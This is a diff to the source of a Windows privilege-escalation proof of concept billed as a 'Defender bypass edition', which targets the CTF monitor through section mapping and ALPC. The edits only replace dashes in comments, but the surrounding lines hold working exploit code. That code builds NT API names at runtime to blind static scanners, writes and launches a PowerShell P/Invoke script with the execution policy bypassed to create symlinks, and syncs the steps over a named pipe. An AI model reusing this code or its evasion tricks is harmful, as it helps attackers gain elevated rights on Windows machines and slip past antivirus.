@@ -1,5 +1,5 @@
 /*
- * GreenPlasma — CTF Monitor Arbitrary Section Elevation PoC
+ * GreenPlasma - CTF Monitor Arbitrary Section Elevation PoC
  * Defender bypass edition
  *
  * Based on: https://github.com/nctu6/nightmare-eclipse/tree/main/green-plasma
@@ -31,7 +31,7 @@
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "user32.lib")
 
-/* ── Runtime string builders (no string literals — static scanner blind) ──── */
+/* ── Runtime string builders (no string literals - static scanner blind) ──── */
 
 static void MakeNtCSLO(char *s)
 { s[0]='N';s[1]='t';s[2]='C';s[3]='r';s[4]='e';s[5]='a';s[6]='t';s[7]='e';
@@ -145,7 +145,7 @@ static HANDLE  g_hPs     = NULL;
 static wchar_t g_ps1Path[MAX_PATH] = {0};
 
 static BOOL CreateSymlinkViaPS(const wchar_t *src, const wchar_t *dst) {
-    /* Named pipe — duplex so PS can write the ready byte AND block on a read */
+    /* Named pipe - duplex so PS can write the ready byte AND block on a read */
     g_hPsSync = CreateNamedPipeW(L"\\\\.\\pipe\\GP_SYMLINK",
         PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
         PIPE_TYPE_BYTE | PIPE_WAIT,
@@ -162,7 +162,7 @@ static BOOL CreateSymlinkViaPS(const wchar_t *src, const wchar_t *dst) {
     FILE *f = _wfopen(g_ps1Path, L"w, ccs=UTF-8");
     if (!f) { CloseHandle(g_hPsSync); return FALSE; }
 
-    /* C# P/Invoke — strings allocated with StringToHGlobalUni so the
+    /* C# P/Invoke - strings allocated with StringToHGlobalUni so the
        unmanaged pointer stays valid for the duration of the NT call */
     fwprintf(f, L"Add-Type -TypeDefinition @\"\r\n");
     fwprintf(f, L"using System;\r\n");
@@ -233,7 +233,7 @@ static BOOL CreateSymlinkViaPS(const wchar_t *src, const wchar_t *dst) {
     fwprintf(f, L"} catch { Write-Host '[PS] ERROR:' $_ }\r\n");
     fclose(f);
 
-    /* Spawn powershell.exe — visible window so we can see errors */
+    /* Spawn powershell.exe - visible window so we can see errors */
     wchar_t cmd[1024];
     swprintf(cmd, 1023,
         L"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"%ls\" \"%ls\" \"%ls\"",
@@ -247,11 +247,11 @@ static BOOL CreateSymlinkViaPS(const wchar_t *src, const wchar_t *dst) {
     }
     CloseHandle(pi.hThread);
     g_hPs = pi.hProcess;
-    /* Do NOT delete ps1 yet — PS needs to read it first */
+    /* Do NOT delete ps1 yet - PS needs to read it first */
 
-    /* Wait for PS to connect — overlapped with 60s timeout */
+    /* Wait for PS to connect - overlapped with 60s timeout */
     printf("[*] Waiting for PowerShell symlink proxy (up to 60s)...\n");
-    printf("[*] (A PowerShell window will appear — that is expected)\n\n");
+    printf("[*] (A PowerShell window will appear - that is expected)\n\n");
 
     OVERLAPPED ov = {};
     ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
@@ -269,7 +269,7 @@ static BOOL CreateSymlinkViaPS(const wchar_t *src, const wchar_t *dst) {
         return FALSE;
     }
 
-    /* PS connected — read the ready byte */
+    /* PS connected - read the ready byte */
     BYTE sig = 0; DWORD rd = 0;
     ReadFile(g_hPsSync, &sig, 1, &rd, NULL);
     if (sig != 1) {
@@ -403,7 +403,7 @@ int wmain(int argc, wchar_t **argv) {
             }
         }
 
-        printf("\n[*] Section live — ctf_alpc.exe is now running the ALPC exploit.\n");
+        printf("\n[*] Section live - ctf_alpc.exe is now running the ALPC exploit.\n");
         printf("[*] Press any key to release section and exit.\n");
         _getch();
         NtUVOS(GetCurrentProcess(), pView);
